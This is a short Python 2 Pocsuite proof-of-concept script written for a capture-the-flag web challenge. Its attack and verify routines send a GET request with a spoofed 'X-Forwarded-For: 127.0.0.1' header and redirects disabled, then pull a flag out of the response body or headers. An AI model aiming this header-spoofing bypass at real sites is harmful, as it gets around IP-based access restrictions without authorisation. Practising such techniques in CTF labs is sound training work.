import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class TestPOC(POCBase):
    appName='CTF'
    name='FindFlag'
    vulID='00000'
    version='1.0'
    author='LzSkyline'
    vulDate='0000-00-00'
    createDate='2017-09-25'
    updateDate='2017-09-25'
    references=['https://www.seebug.org/vuldb/ssvid-00000']
    appPowerLink='https://www.lzskyline.com'
    appVersion='0.0.0'
    vulType='Others'
    desc='https://www.seebug.org/'
    samples=['http://chinalover.sinaapp.com/web1/']
    def _attack(self):
        result={}
        vulurl=self.url
        payload=""
        param={}
        resp=req.get(vulurl,params=param,allow_redirects=False,headers={'X-Forwarded-For':'127.0.0.1'})
        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        print "Status Code: %d" % resp.status_code
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['TextFlag']=self.params['name'] + "{" + match_result.group(1) + "}"
        if 'flag' in resp.headers:
            result['FlagInfo']={}
            result['FlagInfo']['HeaderFlag']=resp.headers["flag"]
        return self.parse_attack(result)
    
    def _verify(self):
        result={}
        vulurl=self.url
        payload=""
        param={}
        resp=req.get(vulurl,params=param,allow_redirects=False,headers={'X-Forwarded-For':'127.0.0.1'})
        print "Status Code: %d" % resp.status_code
        if self.params['name']+'{' in resp.content:
            result['VerifyInfo']={}
            result['VerifyInfo']['URL']=vulurl
            result['VerifyInfo']['TextFlag']="Yes"
        if 'flag' in resp.headers:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            result['VerifyInfo']['HeaderFlag'] = "Yes"

        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

        
register(TestPOC)
        
